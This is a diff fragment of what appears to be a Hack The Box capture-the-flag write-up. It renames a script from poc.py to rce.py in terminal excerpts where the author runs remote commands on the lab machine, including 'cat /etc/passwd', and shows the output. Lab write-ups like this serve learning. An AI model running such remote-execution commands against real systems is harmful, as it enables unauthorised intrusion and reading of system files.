@@ -944,11 +944,11 @@ The application was running as `uid=999(node)` — a low-privilege service accou
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
-└─$ python3 poc.py "uname -a"
+└─$ python3 rce.py "uname -a"
 Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
-└─$ python3 poc.py "cat /etc/passwd"
+└─$ python3 rce.py "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -986,11 +986,11 @@ node:x:999:988::/home/node:/usr/sbin/nologin
 _laurel:x:996:987::/var/log/laurel:/bin/false
 
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
-└─$ python3 poc.py "pwd"                 
+└─$ python3 rce.py "pwd"                 
 /opt/reactor-app
 
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
-└─$ python3 poc.py "ls" 
+└─$ python3 rce.py "ls" 
 app
 next.config.js
 node_modules
